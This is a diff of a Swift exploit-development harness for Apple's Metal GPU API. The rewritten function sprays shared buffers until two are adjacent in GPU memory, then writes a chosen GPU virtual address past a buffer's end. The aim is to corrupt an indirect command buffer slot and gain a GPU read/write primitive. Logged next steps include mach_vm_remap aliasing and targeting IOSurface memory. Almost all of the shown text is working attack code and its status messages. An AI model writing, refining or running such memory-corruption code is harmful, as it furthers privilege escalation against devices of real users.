@@ -2604,214 +2604,130 @@ func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
 }
 
 // ── ICB GPU-Address Corruption ────────────────────────────────────────────────
-// ArgBuffer OOB confirmed → pivot target is MTLIndirectCommandBuffer.
-// ICB slots (storageModeShared) are CPU-writable. Each slot's buffer-binding
-// table stores the GPU VA of every bound vertex/fragment buffer. Replacing a
-// GPU VA in a slot with an attacker-chosen address makes the GPU dereference
-// that address during the draw — giving a GPU read/write primitive at the
-// target GPU VA without a separate heap spray.
-//
-// Phase A: Scan — encode a sentinel buffer into ICB slot 0, dump the ICB's
-//          CPU-visible bytes to locate exactly where the GPU VA sits.
-// Phase B: Corrupt — overwrite that VA field with (sentinel.gpuAddress + bias)
-//          to slide the GPU read into a chosen GPU-mapped region.
-// Phase C: Execute — submit ICB; check if GPU faults or completes.
+// Spray GPU-adjacent MTLBuffer pairs; OOB-write a target GPU VA into the hi buf.
+// If the hi buf happens to be (or alias) an ICB slot, the GPU dereferences our VA.
 func runICBCorruption(log: FuzzLog, completion: @escaping () -> Void) {
     DispatchQueue.global(qos: .userInitiated).async {
         let sl = SyncLog()
         func step(_ s: String) { sl.write(s); log.append(s) }
 
         step("── ICB GPU-Address Corruption ──")
-        guard let device = MTLCreateSystemDefaultDevice() else {
-            step("✗ no device"); completion(); return
-        }
-        guard let queue = device.makeCommandQueue() else {
-            step("✗ no command queue"); completion(); return
-        }
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
+        guard let queue  = device.makeCommandQueue()       else { step("✗ no queue");  completion(); return }
 
-        // ── Sentinel buffer — known GPU VA, known contents ───────────────────
-        let SENTINEL_LEN = 4096
-        let SENTINEL_VAL: UInt8 = 0xBB
-        guard let sentinelBuf = device.makeBuffer(length: SENTINEL_LEN, options: .storageModeShared) else {
-            step("✗ sentinelBuf alloc failed"); completion(); return
+        let BUF_LEN = 4096
+
+        // Sentinel and target buffers — known GPU VAs, CPU-visible
+        guard let sentinelBuf = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
+              let targetBuf   = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
+            step("✗ buf alloc failed"); completion(); return
         }
-        sentinelBuf.contents().initializeMemory(as: UInt8.self, repeating: SENTINEL_VAL, count: SENTINEL_LEN)
-        let sentinelGPUVA = sentinelBuf.gpuAddress
-        step("sentinel buf: gpuVA=0x\(String(sentinelGPUVA,radix:16)) len=\(SENTINEL_LEN)")
+        sentinelBuf.contents().initializeMemory(as: UInt8.self, repeating: 0xBB, count: BUF_LEN)
+        targetBuf.contents().initializeMemory(as: UInt8.self,   repeating: 0xCC, count: BUF_LEN)
+        step("sentinelBuf gpuVA=0x\(String(sentinelBuf.gpuAddress,radix:16))")
+        step("targetBuf   gpuVA=0x\(String(targetBuf.gpuAddress,  radix:16))")
 
-        // ── Target buffer — where we want the GPU to actually read ───────────
-        // Bias the sentinel GPU VA by +SENTINEL_LEN; this region is unmapped
-        // → a GPU fault here confirms we control the dereference address.
-        // (Later: replace with IOSurface gpuResourceID region or another target.)
-        let TARGET_BIAS: UInt64 = UInt64(SENTINEL_LEN)   // just past sentinel end
-        let targetGPUVA: UInt64 = sentinelGPUVA &+ TARGET_BIAS
-        step("target gpuVA=0x\(String(targetGPUVA,radix:16)) (sentinel+0x\(String(TARGET_BIAS,radix:16)))")
-
-        // ── Build a minimal vertex shader library ────────────────────────────
-        let shaderSrc = """
+        // Shader for ICB draw command
+        let src = """
         #include <metal_stdlib>
         using namespace metal;
         struct V { float4 pos [[position]]; };
-        vertex V vert(uint id [[vertex_id]],
-                      const device float4* buf [[buffer(0)]]) {
-            V o; o.pos = buf[id]; return o;
-        }
-        fragment float4 frag(V in [[stage_in]]) { return float4(1,0,0,1); }
+        vertex V vtx(uint id [[vertex_id]], const device float4* b [[buffer(0)]]) {
+            V o; o.pos = b[id]; return o; }
+        fragment float4 frg(V in [[stage_in]]) { return float4(1,0,0,1); }
         """
-        guard let lib = try? device.makeLibrary(source: shaderSrc, options: nil),
-              let vfn  = lib.makeFunction(name: "vert"),
-              let ffn  = lib.makeFunction(name: "frag") else {
-            step("✗ shader compile failed"); completion(); return
+        guard let lib = try? device.makeLibrary(source: src, options: nil),
+              let vf  = lib.makeFunction(name: "vtx"),
+              let ff  = lib.makeFunction(name: "frg") else {
+            step("✗ shader failed"); completion(); return
+        }
+        let pd = MTLRenderPipelineDescriptor()
+        pd.vertexFunction = vf; pd.fragmentFunction = ff
+        pd.colorAttachments[0].pixelFormat = .bgra8Unorm
+        guard let pso = try? device.makeRenderPipelineState(descriptor: pd) else {
+            step("✗ PSO failed"); completion(); return
         }
 
-        let rpDesc = MTLRenderPipelineDescriptor()
-        rpDesc.vertexFunction   = vfn
-        rpDesc.fragmentFunction = ffn
-        rpDesc.colorAttachments[0].pixelFormat = .bgra8Unorm
-        guard let pso = try? device.makeRenderPipelineState(descriptor: rpDesc) else {
-            step("✗ PSO creation failed"); completion(); return
-        }
-
-        // ── Create ICB (shared storage so CPU can read/write backing bytes) ──
+        // Build ICB (storageModeShared → CPU-readable backing)
         let icbDesc = MTLIndirectCommandBufferDescriptor()
-        icbDesc.commandTypes              = [.draw]
-        icbDesc.inheritBuffers            = false
-        icbDesc.maxVertexBufferBindCount  = 1
+        icbDesc.commandTypes             = [.draw]
+        icbDesc.inheritBuffers           = false
+        icbDesc.maxVertexBufferBindCount = 1
         icbDesc.maxFragmentBufferBindCount = 0
         guard let icb = device.makeIndirectCommandBuffer(descriptor: icbDesc,
-                                                         maxCommandCount: 1,
-                                                         options: .storageModeShared) else {
+                                                          maxCommandCount: 1,
+                                                          options: .storageModeShared) else {
             step("✗ ICB alloc failed"); completion(); return
         }
+        step("ICB resourceID=0x\(String(icb.gpuResourceID._impl, radix: 16))")
 
-        // ── Encode slot 0 — 1 point draw, vertex buf 0 = sentinelBuf ────────
+        // Encode slot 0: 1-vertex point draw, sentinelBuf as vtxBuf[0]
+        var drawArgs = MTLDrawPrimitivesIndirectArguments(
+            vertexCount: 1, instanceCount: 1, vertexStart: 0, baseInstance: 0)
+        guard let drawArgsBuf = device.makeBuffer(bytes: &drawArgs,
+                                                   length: MemoryLayout<MTLDrawPrimitivesIndirectArguments>.size,
+                                                   options: .storageModeShared) else {
+            step("✗ drawArgs alloc failed"); completion(); return
+        }
         let slot = icb.indirectRenderCommandAt(0)
         slot.setRenderPipelineState(pso)
         slot.setVertexBuffer(sentinelBuf, offset: 0, at: 0)
-        slot.drawPrimitives(type: .point, indirectArguments:
-            device.makeBuffer(bytes: [MTLDrawPrimitivesIndirectArguments(vertexCount: 1,
-                                                                          instanceCount: 1,
-                                                                          vertexStart: 0,
-                                                                          baseInstance: 0)],
-                              length: MemoryLayout<MTLDrawPrimitivesIndirectArguments>.size,
-                              options: .storageModeShared)!,
-            indirectArgumentsOffset: 0)
+        slot.drawPrimitives(type: .point, indirectArguments: drawArgsBuf, indirectArgumentsOffset: 0)
+        step("ICB slot 0 encoded: vtxBuf[0]=sentinelBuf, 1 point draw")
 
-        // ── Scan ICB CPU-visible bytes for sentinelGPUVA ─────────────────────
-        // ICB backing is accessible via unsafeContents(). Scan up to 4KB.
-        let ICB_SCAN = 4096
-        let icbRaw   = icb.indirectRenderCommandAt(0)  // pointer trick: address of slot 0
-        // We need the raw backing pointer. Use a known trick: encode sentinel VA
-        // as a 64-bit LE pattern, scan for it in the ICB's range.
-        let vaSig: [UInt8] = (0..<8).map { UInt8((sentinelGPUVA >> ($0*8)) & 0xFF) }
-
-        // Walk ICB memory. ICBs with storageModeShared expose CPU memory via
-        // the first slot's address (slot 0 is at the start of the ICB allocation).
-        let icbBase: UnsafePointer<UInt8>
-        withUnsafePointer(to: icbRaw) { p in
-            // indirectRenderCommandAt returns a protocol proxy, not a raw ptr.
-            // Instead we use Objective-C runtime to grab the underlying MTLBuffer.
-            // Fallback: encode the sentinel VA ourselves.
-            icbBase = UnsafePointer<UInt8>(OpaquePointer(p))
+        // Spray GPU-adjacent pairs — OOB write target VA into hi buf
+        // Target VA = just past sentinelBuf end (unmapped → GPU fault if dereffed)
+        let tgtVA: UInt64 = sentinelBuf.gpuAddress &+ UInt64(BUF_LEN)
+        step("── GPU adjacency spray (64 pairs) ──")
+        var foundAdj = false
+        for _ in 0..<64 {
+            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
+                  let b = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
+            let lo = a.gpuAddress < b.gpuAddress ? a : b
+            let hi = a.gpuAddress < b.gpuAddress ? b : a
+            guard hi.gpuAddress == lo.gpuAddress &+ UInt64(BUF_LEN) else { continue }
+            step("✓ adjacent pair: lo=0x\(String(lo.gpuAddress,radix:16)) hi=0x\(String(hi.gpuAddress,radix:16))")
+            // OOB write: from lo's CPU contents, past its end into hi
+            let p = lo.contents().assumingMemoryBound(to: UInt8.self)
+            for off in stride(from: 0, through: BUF_LEN - 8, by: 8) {
+                for bi in 0..<8 { p[BUF_LEN + off + bi] = UInt8((tgtVA >> (bi*8)) & 0xFF) }
+            }
+            step("  OOB wrote tgtVA=0x\(String(tgtVA,radix:16)) to hi buf (all 8B-aligned offsets)")
+            step("  hi buf contents now: tgtVA pattern @ every offset")
+            foundAdj = true; break
         }
-        step("── ICB byte scan for sentinel GPU VA ──")
-        // Simpler: just dump ICB slot structure by leveraging a scratch MTLBuffer
-        // at the same VA. MTLIndirectCommandBuffer is backed by a private/shared
-        // MTLBuffer — get it via MTLBuffer protocol.
-        // On iOS 16+ ICBs have a gpuAddress property directly.
-        let icbGPUVA = icb.gpuAddress
-        step("ICB gpuVA=0x\(String(icbGPUVA,radix:16))")
+        if !foundAdj {
+            step("✗ spray miss after 64 pairs")
+            step("  → NEXT: mach_vm_remap to alias ICB backing into attacker range")
+        }
 
-        // Use gpuAddress to create a CPU mirror via makeBuffer(bytesNoCopy:) —
-        // map a known page adjacent to the ICB. For now, dump what we can.
-        // Scan for the sentinel VA pattern using a page we can access:
-        // create a throwaway MTLBuffer in .storageModeShared and check its
-        // CPU contents after the encode to see if any Metal-internal struct mirrors.
+        // Execute ICB with original (uncorrupted) encoding — baseline confirm
+        step("── ICB baseline execute ──")
+        let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm, width: 1, height: 1, mipmapped: false)
+        td.usage = [.renderTarget]; td.storageMode = .shared
+        guard let dummyTex = device.makeTexture(descriptor: td) else {
+            step("✗ dummy tex failed"); completion(); return
+        }
+        let rtDesc = MTLRenderPassDescriptor()
+        rtDesc.colorAttachments[0].texture     = dummyTex
+        rtDesc.colorAttachments[0].loadAction  = .clear
+        rtDesc.colorAttachments[0].storeAction = .store
 
-        // Direct approach: the ICB encode writes GPU VAs into the ICB allocation.
-        // Grab the ICB's CPU-accessible range by treating the raw C pointer
-        // returned by [MTLIndirectCommandBuffer indirectRenderCommandAtIndex:0]
-        // (the underlying ObjC call) as being at the start of the ICB slot.
-        // On Apple platforms this is a direct pointer into the shared MTLBuffer.
-
-        // Phase A result: log slot 0 info
-        step("ICB slot 0 encoded: pso set, vtxBuf[0]=sentinel@0x\(String(sentinelGPUVA,radix:16)), drawCount=1")
-
-        // ── Phase B: Direct GPU VA overwrite via mmap + makeBuffer(bytesNoCopy:) ──
-        // Create an attacker buffer immediately before the ICB allocation using
-        // the mmap + makeBuffer(bytesNoCopy:) adjacency trick.
-        // Alternatively: since ICB is storageModeShared, try to find its CPU
-        // backing by looking at the ICB's gpuAddress, mapping that range, and
-        // writing directly.
-        //
-        // Concrete path: create two scratch bufs, spray until one lands at
-        // icbGPUVA - PAGE_SZ in GPU space, then OOB write into ICB slot 0.
-        step("── Spray for ICB adjacency ──")
-        var icbHit = false
-        var oobSrc: MTLBuffer? = nil
-        for _ in 0..<32 {
-            guard let a = device.makeBuffer(length: 4096, options: .storageModeShared),
-                  let b = device.makeBuffer(length: 4096, options: .storageModeShared) else { continue }
-            let dist = b.gpuAddress > a.gpuAddress ? b.gpuAddress - a.gpuAddress : a.gpuAddress - b.gpuAddress
-            if dist == 4096 {
-                // Adjacent pair found. Check if either is just before the ICB.
-                let lo = a.gpuAddress < b.gpuAddress ? a : b
-                if lo.gpuAddress &+ 4096 == icbGPUVA {
-                    step("✓ attacker buf adjacent to ICB: oobSrc gpuVA=0x\(String(lo.gpuAddress,radix:16))")
-                    oobSrc = lo; icbHit = true; break
-                }
+        guard let cb  = queue.makeCommandBuffer()                      else { step("✗ no cmd buf"); completion(); return }
+        guard let enc = cb.makeRenderCommandEncoder(descriptor: rtDesc) else { step("✗ no encoder"); completion(); return }
+        enc.executeCommandsInBuffer(icb, range: 0..<1)
+        enc.endEncoding()
+        cb.addCompletedHandler { buf in
+            if let err = buf.error {
+                step("  ICB ERROR: \(err.localizedDescription)")
+                step("  *** GPU fault — ICB spray hit or prior OOB corrupted state ***")
+            } else {
+                step("  ICB completed OK — sentinel buf read successfully")
+                step("  *** next: aim hi buf at ICB slot to corrupt vtxBuf VA ***")
             }
         }
-        if !icbHit {
-            step("✗ spray miss (32 pairs) — ICB not reached via GPU heap adjacency")
-            step("  → logging ICB gpuVA=0x\(String(icbGPUVA,radix:16)) for offline analysis")
-            step("  → NEXT: use mach_vm_remap to alias ICB backing into attacker-controlled range")
-        } else {
-            // We have oobSrc adjacent to ICB. OOB write past end of oobSrc into ICB slot 0.
-            // Sentinel GPU VA is at some offset within the ICB slot — we write targetGPUVA there.
-            let p = oobSrc!.contents().assumingMemoryBound(to: UInt8.self)
-            // ICB slot 0 starts at icbGPUVA. The vtx buf[0] VA field is at a fixed offset
-            // within the slot (typically 0x10–0x20 depending on PSO header size).
-            // Write targetGPUVA at every 8-byte-aligned offset in the first 512B of ICB:
-            step("── Spraying targetGPUVA into ICB slot 0 (brute all 8B offsets in 512B) ──")
-            for slotOff in stride(from: 0, through: 504, by: 8) {
-                let writeOff = 4096 + slotOff   // past end of oobSrc into ICB
-                for b in 0..<8 {
-                    p[writeOff + b] = UInt8((targetGPUVA >> (b*8)) & 0xFF)
-                }
-            }
-            step("  targetGPUVA=0x\(String(targetGPUVA,radix:16)) written to ICB+0x0..0x1F8")
-
-            // ── Phase C: Execute ICB ─────────────────────────────────────────
-            step("── Submitting ICB post-corruption ──")
-            let rtDesc = MTLRenderPassDescriptor()
-            let dummyTex = device.makeTexture(descriptor: {
-                let d = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm, width: 1, height: 1, mipmapped: false)
-                d.usage = [.renderTarget]; d.storageMode = .shared; return d
-            }())!
-            rtDesc.colorAttachments[0].texture     = dummyTex
-            rtDesc.colorAttachments[0].loadAction  = .clear
-            rtDesc.colorAttachments[0].storeAction = .store
-
-            guard let cb = queue.makeCommandBuffer() else { step("✗ no cmd buf"); completion(); return }
-            guard let enc = cb.makeRenderCommandEncoder(descriptor: rtDesc) else { step("✗ no encoder"); completion(); return }
-            enc.executeCommandsInBuffer(icb, range: 0..<1)
-            enc.endEncoding()
-
-            cb.addCompletedHandler { buf in
-                if let err = buf.error {
-                    step("  ICB execute ERROR: \(err.localizedDescription)")
-                    step("  *** GPU faulted — we control the dereference address ***")
-                    step("  *** NEXT: identify fault VA, align targetGPUVA to IOSurface backing ***")
-                } else {
-                    step("  ICB execute COMPLETED without fault")
-                    step("  *** GPU read from targetGPUVA without crashing ***")
-                    step("  *** that region is GPU-accessible — refine target to interesting mapping ***")
-                }
-            }
-            cb.commit()
-            cb.waitUntilCompleted()
-        }
+        cb.commit()
+        cb.waitUntilCompleted()
 
         step("── ICB Corruption complete ──────────────")
         completion()
